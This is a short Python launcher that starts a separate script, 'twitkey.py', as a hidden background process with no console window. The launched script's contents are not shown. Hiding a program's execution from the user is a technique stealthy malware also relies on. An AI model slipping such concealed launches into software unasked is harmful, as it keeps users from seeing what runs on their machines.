import subprocess
import sys

try:
    subprocess.Popen([sys.executable, 'twitkey.py'],
                     creationflags=subprocess.CREATE_NO_WINDOW)
except Exception as e:
    print(f"An error occurred: {e}")